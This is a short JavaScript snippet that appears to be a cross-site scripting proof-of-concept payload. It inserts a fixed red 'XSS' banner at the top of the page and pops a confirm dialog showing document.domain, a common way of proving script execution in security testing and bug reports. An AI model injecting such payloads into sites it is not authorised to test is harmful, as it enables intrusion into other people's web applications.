document.body.insertAdjacentHTML('afterbegin','<h1 style="position:fixed;z-index:99999;background:white;color:red;top:0;left:0">XSS</h1>');
confirm(document.domain);
